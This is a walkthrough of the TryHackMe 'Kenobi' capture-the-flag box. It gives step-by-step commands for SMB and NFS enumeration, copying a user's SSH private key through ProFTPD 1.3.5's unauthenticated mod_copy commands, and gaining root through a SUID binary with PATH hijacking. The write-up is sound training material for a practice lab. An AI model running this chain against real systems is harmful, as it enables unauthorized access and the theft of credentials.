---
title: "TryHackMe — Kenobi Walkthrough"
summary: "Kenobi is a beginner Linux box themed around Star Wars. The attack chain is a clean example of how chaining together multiple low-severity misconfigur..."
date: "2026-03-23"
tags: ["tryhackme","walkthrough"]
---

## Overview

Kenobi is a beginner Linux box themed around Star Wars. The attack chain is a clean example of how chaining together multiple low-severity misconfigurations leads to full root compromise. You'll cover:

- Port scanning and service enumeration with **Nmap**
- **SMB/Samba** share enumeration
- **NFS** share enumeration and mounting
- Exploiting **ProFTPD 1.3.5** via the `mod_copy` vulnerability
- Stealing an **SSH private key** via FTP file copy commands
- Privilege escalation via **SUID binary + PATH hijacking**

---
## Task 1 — Deploy the Machine

Connect to TryHackMe via OpenVPN and deploy the machine. Set your IP as an environment variable to use throughout:

The machine takes ~2 minutes to boot. You'll notice a **Star Wars-themed splash page** at `http://<Machine-IP>` — fun touch, nothing exploitable here.

> ✅ **Answer:** Deploy the machine → _No answer needed_

---

## Task 2 — Reconnaissance

### Step 1: Nmap Full Scan

```bash
nmap -sV -sC -A -p- -T4 <Machine-IP>
```

![1.jpg](/images/blog/1.jpg)

**7 ports open.** Key observations:

- FTP on port 21 running **ProFTPD 1.3.5** — a known vulnerable version
- SMB on ports **139 and 445** — Samba shares to enumerate
- Port **111 (rpcbind)** + **2049 (NFS)** — network file system potentially mountable

### Step 2: SMB Enumeration

Use Nmap's built-in SMB scripts to enumerate shares and users:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <Machine-IP>
```

![Screenshot_2026-04-11_09-16-27.jpg](/images/blog/Screenshot_2026-04-11_09-16-27.jpg)

**Output shows 3 shares:**

- `IPC$`
- `anonymous`
- `print$`

### Step 3: Access the Anonymous Share

```bash
smbclient //<Machine-IP>/anonymous
```

![Screenshot_2026-04-11_09-17-21.png](/images/blog/Screenshot_2026-04-11_09-17-21.png)

When prompted for a password, just hit **Enter** (anonymous login).

```bash
smb: \> ls
  .
  ..
  log.txt
smb: \> get log.txt
```

Read `log.txt`:

```bash
cat log.txt
```

**Critical findings inside `log.txt`:**

- An RSA key pair was generated for the user **kenobi**
- Key stored at `/home/kenobi/.ssh/id_rsa`
- **ProFTPD** is configured and running on port **21**

### Step 4: NFS Enumeration

Port 111 is rpcbind — used for NFS. Enumerate what's exposed:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <Machine-IP>
```

![Screenshot_2026-04-11_09-18-08.png](/images/blog/Screenshot_2026-04-11_09-18-08.png)

**Output:**

```
| nfs-showmount:
|_  /var *
```

The `/var` directory is **exported to the world via NFS** — this is the pivot point we'll exploit later.

### Task 2 Answers

|Question|Answer|
|---|---|
|Ports open?|`7`|
|Samba shares found?|`3`|
|Log file on share?|`log.txt`|
|FTP port?|`21`|
|What is mountable?|`/var`|

---

## Task 3 — Gaining Initial Access via ProFTPD

### What is ProFTPD mod_copy?

**ProFTPD 1.3.5** ships with a module called `mod_copy`. This module implements the `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) commands — and critically, **these commands are accessible without authentication** in this version.

This means anyone can copy any file on the server to any writable path — including Kenobi's private SSH key.

### Step 1: Confirm the Vulnerability with Searchsploit

```bash
searchsploit proftpd 1.3.5
```

![Screenshot_2026-04-11_09-18-52.png](/images/blog/Screenshot_2026-04-11_09-18-52.png)

The `mod_copy` file copy exploit is what we need — no Metasploit required.

### Step 2: Connect to FTP via Netcat and Copy the SSH Key

Connect raw to the FTP service:

```bash
nc <Machine-IP> 21
```

You'll see the ProFTPD banner. Now issue the copy commands:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Expected responses:

```
350 File or directory exists, ready for destination name
250 Copy successful
```

Kenobi's private key is now sitting in `/var/tmp/` — inside the NFS-exported `/var` directory.

### Step 3: Mount the NFS Share and Retrieve the Key

On your attacker machine:

```bash
mkdir /mnt/kenobiNFS
sudo mount <Machine-IP>:/var /mnt/kenobiNFS
ls /mnt/kenobiNFS/tmp/
```

![Screenshot_2026-04-11_09-19-16.png](/images/blog/Screenshot_2026-04-11_09-19-16.png)

![Screenshot_2026-04-11_09-19-31.png](/images/blog/Screenshot_2026-04-11_09-19-31.png)

You'll see `id_rsa` sitting there. Copy it out:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

![Screenshot_2026-04-11_09-19-45.png](/images/blog/Screenshot_2026-04-11_09-19-45.png)

### Step 4: SSH into the Machine as Kenobi

```bash
ssh -i id_rsa kenobi@<Machine-IP>
```

![Screenshot_2026-04-11_09-20-16.png](/images/blog/Screenshot_2026-04-11_09-20-16.png)
### Step 5: Get the User Flag

```bash
cat /home/kenobi/user.txt
```

![Screenshot_2026-04-11_09-20-30.png](/images/blog/Screenshot_2026-04-11_09-20-30.png)

### Task 3 Answers

|Question|Answer|
|---|---|
|ProFTPD version?|`1.3.5`|
|Exploit used?|`mod_copy`|
|Commands used?|`SITE CPFR` / `SITE CPTO`|
|User flag?|_[capture from `/home/kenobi/user.txt`]_|

---

## Task 4 — Privilege Escalation (SUID + PATH Hijacking)

### Step 1: Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Screenshot_2026-04-11_09-20-46.png](/images/blog/Screenshot_2026-04-11_09-20-46.png)

Scan through the output. Most are standard system binaries (`passwd`, `sudo`, etc.). One stands out
`/usr/bin/menu` is **not a standard Linux binary** — it's custom and has the SUID bit set, meaning it runs as root.

### Step 2: Run the Binary and Understand It

```bash
/usr/bin/menu
```

![Screenshot_2026-04-11_09-21-48.png](/images/blog/Screenshot_2026-04-11_09-21-48.png)
### Step 3: Inspect the Binary with `strings`

```bash
strings /usr/bin/menu
```

![Screenshot_2026-04-11_09-22-14.png](/images/blog/Screenshot_2026-04-11_09-22-14.png)

The binary calls `curl`, `uname`, and `ifconfig` — but **without full absolute paths**. This means it relies on the system `$PATH` to find these commands.

Since the binary runs as root (SUID), if we trick it into running our own fake `curl` script, **our script will execute as root**.

### Step 4: Create a Fake `curl` and Hijack PATH

```bash
# Go to a writable directory in our home
cd /home/kenobi

# Create a fake "curl" that spawns a shell
echo '/bin/bash' > curl
chmod +x curl

# Prepend our directory to PATH
export PATH=/home/kenobi:$PATH
```

![Screenshot_2026-04-11_09-22-455 1.png](/images/blog/Screenshot_2026-04-11_09-22-455_1.png)

### Step 5: Run the SUID Binary and Choose Option 1

```bash
/usr/bin/menu
```

![Screenshot_2026-04-11_09-22-453.png](/images/blog/Screenshot_2026-04-11_09-22-453.png)

Select `1` (status check — which calls `curl`).

```bash
root@kenobi:/home/kenobi# id
uid=0(root) gid=0(root) groups=0(root)
```

![Screenshot_2026-04-11_09-22-452.png](/images/blog/Screenshot_2026-04-11_09-22-452.png)
**Root shell obtained.**

### Step 6: Get the Root Flag

```bash
cat /root/root.txt
```

![Screenshot_2026-04-11_09-22-451.png](/images/blog/Screenshot_2026-04-11_09-22-451.png)###  Task 4 Answers

|Question|Answer|
|---|---|
|SUID file that stands out?|`/usr/bin/menu`|
|Number of options in menu binary?|`3`|
|Root flag?|_[capture from `/root/root.txt`]_|

---
## Key Takeaways

**1. Anonymous SMB = Free Info for Attackers** The shared folder had no password. We just walked in and found a file that told us exactly where the SSH key was hidden.

**2. Old FTP Software = Free File Access** ProFTPD 1.3.5 had a bug where anyone could say "copy this file to there" — no login needed. We used that to move Kenobi's private SSH key to a folder we could access. 

**3. Open NFS = Your Hard Drive is Public** The `/var` folder was shared with literally everyone on the network. We just mounted it like a USB drive and grabbed the SSH key. 

**4. SUID + No Full Path = Instant Root** A program running with root power was calling `curl` without specifying where `curl` actually lives. So we made a fake `curl` that opens a shell, tricked the program into running ours instead, and became root.